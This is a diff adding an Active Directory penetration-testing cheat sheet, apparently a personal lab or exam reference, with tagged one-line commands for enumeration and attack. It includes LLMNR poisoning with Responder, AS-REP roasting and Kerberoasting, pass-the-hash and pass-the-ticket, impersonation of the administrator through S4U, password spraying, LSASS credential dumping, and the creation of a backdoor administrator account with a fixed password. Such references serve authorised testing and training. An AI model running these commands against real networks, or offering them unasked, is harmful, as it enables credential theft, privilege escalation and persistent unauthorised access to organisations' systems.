@@ -1,0 +1,132 @@
+^AD notes:Scan all TCP ports.
+^AD notes:Check ldap, rpc, smb with anonymous access. Check for public share.
+^AD notes:Find usernames: If you get access, look for usernames with stuff like nxc --rid-brute, --users, and enumdomuser with rpcclient to get list of users in domain without needed initial credentials. Check usernames with kerbrute.
+^AD notes:Test for asreproasting after you have collected usernames. If successful, try cracking.
+^AD notes:Check for kerberoasting after you have a username and password.
+^AD notes:Try authenticating with every possible protocol with those set of credentials. winrm, rdp, mssql, smb, rpc, ldap etc.
+^AD notes:Enumerate shares for every user you get access to. Every new user means you should recheck their shares.
+^AD notes:If you get shell as a user, check for privesc, and dump all hashes and collect them in a file for possible bruteforcing and lateral movement.
+^AD notes:Run bloodhound and check for basic attacks like DCsync. Also checks for other paths bloodhound may find.
+^AD notes:Check for Certificate based attacks with certipy 
+^AD notes:If it's an AD network, check for additional network adapters in case of pivoting being needed. If so, set up a pivot and relay all tools over that “jumpbox” so you can target the other machines in the other network.
+^AD notes:Remember to bruteforce different protocols with credentials you have. Remember to use NTLM authentication too.
+^AD notes:After localadmin on a windows host, dump all hashes using nxc and/or mimikatz.
+^AD notes:Recheck all NTLM hashes and passwords against all users on all AD hosts, both locally and on domain users.
+^AD notes:Check UDP ports. 
+^AD notes:Rescan if you're stuck, verify tools are working properly and you're running them properly.
+^AD Responder:sudo responder -i tun0 -A #kali-machine
+Powershell:pwsh -ep bypass #target-machine
+Powershell:Get-ExecutionPolicy -Scope CurrentUser #change global script policy; kali-machine
+Powershell:Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser #change global script policy; kali-machine
+Powershell:Get-ExecutionPolicy -Scope CurrentUser #change global script policy; kali-machine
+Basic Domain Info:net view /domain #target-machine
+Basic Domain Info:net view \\<hostname> /all #target-machine
+Basic Domain Info:nltest /dclist:<domain> #target-machine
+Basic Domain Info:nltest /dsgetdc:<domain> #target-machine
+Basic Domain Info:nltest /dsgetsite #target-machine
+Basic Domain Info:systeminfo | findstr /B /C:"Domain" #target-machine
+Basic Domain Info:echo %USERDOMAIN% #target-machine
+Forest Information:nltest /domain_trusts #target-machine
+Forest Information:nltest /forest_trusts #target-machine
+User Enumeration:Get-LocalUser #Powershell; kali-machine
+User Enumeration:Get-LocalGroupMember <localgroup> #Powershell; kali-machine
+User Enumeration:net user /domain #Net; target-machine
+User Enumeration:net user <user> /domain #Net; target-machine
+User Enumeration:net accounts /domain #Net; target-machine
+User Enumeration:net group "domain admins" /domain #Net; target-machine
+User Enumeration:net group "enterprise admins" /domain #Net; target-machine
+User Enumeration:impacket-GetADUsers -dc-ip <dc-ip> '<domain>/<user>':'<password>' -all #Impacket; kali-machine
+User Enumeration:impacket-GetADUsers -dc-ip <dc-ip> -k -no-pass <domain>/ #Impacket; kali-machine
+Computer Enumeration:net group "domain computers" /domain #Net; target-machine
+User/Groups/Computer Enumeration:impacket-lookupsid 'guest'@<dc-ip> -no-pass #enumerate domain users and groups by resolving SIDs/RIDs over SMB using the Guest account with no password; kali-machine
+User/Groups/Computer Enumeration:impacket-lookupsid '':''@<dc-ip> -no-pass #enumerate domain users, groups, and computers by resolving SIDs/RIDs over SMB using a null session (no username, no password); kali-machine
+User/Groups/Computer Enumeration:impacket-lookupsid '<domain>/<user>':'<password>'@<dc-ip> #Impacket; kali-machine
+User/Groups/Computer Enumeration:impacket-lookupsid -no-pass -k <domain>/<user>@<dc-ip> #Impacket; kali-machine
+User/Groups/Computer Enumeration:impacket-lookupsid -no-pass <user>@<dc-ip> #Impacket; kali-machine
+Group Enumeration:Get-LocalGroup #Powershell; kali-machine
+Group Enumeration:net group /domain #Net; target-machine
+Group Enumeration:impacket-netview -dc-ip <dc-ip> <domain>/<user>:<password> #Impacket; kali-machine
+Group Enumeration:impacket-netview -dc-ip <dc-ip> -k -no-pass <domain>/ #Impacket; kali-machine
+Share Enumeration:net view \\<dc-ip> #Net; target-machine
+Share Enumeration:impacket-smbclient -dc-ip <dc-ip> '<domain>/<user>':'<password>'@<dc-ip> #Impacket; kali-machine
+Share Enumeration:impacket-smbclient -k -no-pass -dc-ip <dc-ip> <domain>/@<dc-ip> #Impacket; kali-machine
+service enumeration:impacket-services '<domain>/<user>':'<password>'@<target> #Impacket; kali-machine
+smb:smbclient -L //<target> -U '<user>%<ntlm>' --pw-nt-hash -p <port> #list shares with NT hash auth; kali-machine
+smb:smbclient //<target>/<folder> -U '<user>%<ntlm>' --pw-nt-hash -p <port> #list shares with NT hash auth; kali-machine
+GPO Enumeration:gpresult /z #kali-machine
+GPO Enumeration:gpresult /r #kali-machine
+DNS Enumeration:impacket-adidnsdump -dc-ip <dc-ip> <domain>/<user>:<password> #Impacket; kali-machine
+DNS Enumeration:impacket-adidnsdump -dc-ip <dc-ip> -k -no-pass <domain>/ #Impacket; kali-machine
+Bloodhound Python Ingestor:bloodhound-ce-python -d <domain> -u <user> -p <password> -dc <dc-ip> -ns <dc-ip> -c All #kali-machine
+Bloodhound Python Ingestor:bloodhound-ce-python -d <domain> -u <user> -p <password> -dc <dc-ip> -k -c All -no-pass #kali-machine
+Bloodhound Python Ingestor:bloodhound-ce-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c Group,LocalAdmin,RDP,DCOM,Session #kali-machine
+Bloodhound Python Ingestor:bloodhound-ce-python -u "<user>" -p '<password>' -d <domain> -c all --zip -ns <target> #kali-machine
+Bloodhound Python Ingestor:bloodhound-ce-python -u "<user>" --hashes '<ntlm>' -d <domain> -c all --zip -ns <target> #--hashes HASHES LM:NLTM hashes; kali-machine
+Bloodhound Sharphound Ingestor:SharpHound.exe -c All #target-machine
+Bloodhound Sharphound Ingestor:SharpHound.exe --CollectionMethods All --Domain <domain> --DNSHost <dc-ip> #target-machine
+Bloodhound Sharphound Ingestor:SharpHound.exe -c Group,LocalAdmin,RDP,DCOM,Session --ZipFileName <filename> #target-machine
+Bloodhound Sharphound Ingestor:SharpHound.exe -c Session --Loop --loopduration 00:00:10 #Stealth; target-machine
+Rebeus AS-REP Roast:Rubeus.exe asreproast #target-machine
+Rebeus AS-REP Roast:Rubeus.exe asreproast /format:hashcat /outfile:<filename> #target-machine
+Rebeus Kerberoast:Rubeus.exe kerberoast #target-machine
+Rebeus Kerberoast:Rubeus.exe kerberoast /stats #target-machine
+Rebeus Kerberoast:Rubeus.exe kerberoast /rc4opsec #target-machine
+Rebeus Kerberoast:Rubeus.exe kerberoast /aes #target-machine
+Rebeus Kerberoast:Rubeus.exe kerberoast /outfile:<filename> #target-machine
+Rebeus TGT Request:Rubeus.exe asktgt /user:<user> /aes256:<ntlm> /domain:<domain> /dc:<dc-ip> /ptt #target-machine
+Rebeus TGT Request:Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /domain:<domain> /dc:<dc-ip> /ptt #target-machine
+Rebeus TGS Request:Rubeus.exe asktgs /ticket:<file> /service:<file> /ptt #target-machine
+Rebeus S4U2Self:Rubeus.exe s4u /user:<user> /rc4:<ntlm> /impersonateuser:administrator /msdsspn:host/<dc-ip>.<domain> /ptt #target-machine
+Rebeus S4U2Proxy:Rubeus.exe s4u /user:<user> /rc4:<ntlm> /impersonateuser:administrator /altservice:ldap /msdsspn:host/<dc-ip>.<domain> /ptt #target-machine
+Rebeus TGT Harvest:Rubeus.exe harvest /interval:30 #target-machine
+Rebeus TGT Harvest:Rubeus.exe harvest /interval:60 /nowrap #target-machine
+Rebeus Ticket Management:Rubeus.exe ptt /ticket:<file> #target-machine
+Rebeus Ticket Management:Rubeus.exe dump /nowrap #target-machine
+Rebeus Ticket Management:Rubeus.exe purge #target-machine
+Rebeus Ticket Management:Rubeus.exe triage #target-machine
+Rebeus Password Spray:Rubeus.exe brute /password:<password> /noticket #target-machine
+Rebeus Password Spray:Rubeus.exe brute /passwords:<wordlist1> /noticket /outfile:<filename> #target-machine
+Rebeus Pass The Ticket:Rubeus.exe ptt /ticket:<file> #target-machine
+Rebeus Pass The Hash:Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt #target-machine
+ldap search:ldapsearch -x -H ldap://<target> -D '<domain>\<user>' -w '<password>' -b 'DC=<sld>,DC=<tld>' #Get all users; kali-machine
+ldap search:ldapsearch -x -H ldap://<target> -D '<domain>\<user>' -w '<password>' -b 'DC=<sld>,DC=<tld>' | grep userPrincipalName | sed 's/userPrincipalName: //' #Get all users and cleanup output; kali-machine
+ldap search:ldapsearch -x -H ldap://<target> -b 'DC=<sld>,DC=<tld>' #Without credentials; kali-machine
+ldap search:ldapsearch -x -H ldap://<target> -b 'DC=<sld>,DC=<tld>' | grep userPrincipalName | sed 's/userPrincipalName: //' #Without credentials; kali-machine
+ldap search:ldapsearch -x -H ldap://<target> -b "DC=<sld>,DC=<tld>" "(objectClass=user)" sAMAccountName | grep sAMAccountName | grep -v 'HealthMailbox' | awk '{print $2}' #Without credentials and clean output; kali-machine
+ldap search:ldapsearch -x -H ldap://<target> -b "DC=<sld>,DC=<tld>" "(sAMAccountName=<user>)" #search for entity; kali-machine
+ldap search:ldapsearch -x -H ldap://<target> -b "DC=<sld>,DC=<tld>" "(objectClass=person)" sAMAccountName | grep sAMAccountName | grep -v 'HealthMailbox' | awk '{print $2}' #Without credentials, broad user search; kali-machine
+Kerbrute User Enum:kerbrute userenum -d <domain> --dc <dc-ip> <wordlist1> #kali-machine
+create new local user and add to administrator group:net user edwin P@ssw0rd@123 /add #target-machine
+create new local user and add to administrator group:net localgroup administrators edwin /add #target-machine
+create new domain user and add to domain group:net user edwin P@ssw0rd@123 /add /domain #target-machine
+create new domain user and add to domain group:net group "<group>" edwin /add #target-machine
+create new domain user and add to domain group:net localgroup "Remote Management Users" edwin /add #target-machine
+create new domain user and add to domain group:net localgroup "Remote Desktop Users" edwin /add #target-machine
+donpapi collect -t <target> -d <domain> -u <user> -H:<ntlm> #kali-machine
+^Domain info probe:nxc smb <target> #probe SMB to fingerprint domain/workgroup, host OS, SMB signing, and basic share/auth posture (no creds); kali-machine
+nxc smb:nxc smb <target> -u '' -p '' --ridbrute #enumerate domain users/groups via RID brute-force over SMB using a null session (no creds); kali-machine
+nxc smb:nxc smb <target> -u 'guest' -p '' --ridbrute #enumerate domain users/groups via RID brute-force over SMB using the Guest account with a blank password; kali-machinenxc smb:nxc smb <target> -u '<user>' -H '<ntlm>' --local-auth #local auth with NT hash; kali-machine
+nxc smb:nxc smb <target> -d '<domain>' -u '<user>' -H '<ntlm>' #domain auth with NT hash; kali-machine
+nxc smb:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --shares #list shares; kali-machine
+nxc smb:nxc smb <target> -u '<domain>\<user>' -p '<password>' --shares #list shares; kali-machine
+nxc smb:nxc smb <target> -u '<domain>\<user>' -p '<password>' --users #list users; kali-machine
+nxc rdp:nxc rdp <target> -u <user> -p '<password>' --verbose # validate creds against RDP and gather info
+nxc winrm:nxc winrm <target> -u <user> -p '<password>' --verbose # validate creds for WinRM remote shell
+Credential-dump via SMB:nxc smb <target> -u '<domain>\<user>' -p '<password>' -M lsassy #nxc lsassy module; kali-machine
+create new local admin and rdp in:net user edwin P@ssw0rd@123 /add #target-machine
+create new local admin and rdp in:net localgroup administrators edwin /add #target-machine
+create new local admin and rdp in:net user edwin #target-machine
+create new local admin and rdp in:xfreerdp3 /v:<target> /u:edwin /p:'P@ssw0rd@123' /dynamic-resolution /clipboard /drive:share,/home/kali #kali-machine
+^Enumerates all users and groups with high-level AD rights (GenericAll, GenericWrite, WriteDacl, WriteOwner, AddMember, ForceChangePassword) on other objects:$interesting='GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword'; (Get-NetUser|Select-Object -ExpandProperty samaccountname) + (Get-NetGroup|Select-Object -ExpandProperty cn)|ForEach-Object{$o=$_;Get-ObjectAcl -Identity $o|Where-Object{$_.ActiveDirectoryRights -match $interesting}|ForEach-Object{$r=Convert-SidToName -Sid $_.SecurityIdentifier;[PSCustomObject]@{Object=$o;Principal=$r;Rights=$_.ActiveDirectoryRights}}}|Format-Table -AutoSize #target-machine
+^PowerView:Get-NetForestDomain #kali-machine
+^Takes all SIDs from Get-ObjectAcl -Identity <user> and resolves them to names with PowerView’s Convert-SidToName:Import-module .\PowerView.ps1 #kali-machine
+^Takes all SIDs from Get-ObjectAcl -Identity <user> and resolves them to names with PowerView’s Convert-SidToName:Get-ObjectAcl -Identity <user> | ForEach-Object { [PSCustomObject]@{ IdentityReference = (Convert-SidToName -Sid $_.SecurityIdentifier); SID = $_.SecurityIdentifier; Rights = $_.ActiveDirectoryRights } } | Format-Table -AutoSize #kali-machine
+^Resolve SID to account name:[System.Security.Principal.SecurityIdentifier]::new("<SID>").Translate([System.Security.Principal.NTAccount]) #kali-machine
+Port Scan:Test-NetConnection -Port <port> <target> #Powershell; kali-machine
+telnet:dism /online /Enable-Feature /FeatureName:TelnetClient #Powershell; kali-machine
+telnet:telnet <target> <port> #Powershell; kali-machine
+pypykatz:pypykatz lsa minidump <filename1> #parse an LSASS minidump (e.g. lsass.dmp) to extract credentials, hashes, and tickets; kali-machine
+username-generation:/home/kali/Tools/git-tools/username-anarchy/username-anarchy -i <wordlist1> #generate username permutations from a list of names (first/last/full); kali-machine
+username-generation:/home/kali/Tools/git-tools/username-anarchy/username-anarchy --recognise <user> #analyze an existing username to infer naming scheme and likely permutations; kali-machine
+AD CS vulnerability enumeration:certipy-ad find -u '<user>' -p '<password>' -dc-ip <target> -vulnerable #enumerate Active Directory Certificate Services objects and identify misconfigurations/vulnerable templates (ESC paths); kali-machine
+Domain user enumeration (RID brute):nxc smb <target> -u '<user>' -p '<password>' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f2 | tee users.txt #enumerate all domain user accounts via RID brute-force and extract usernames; kali-machine
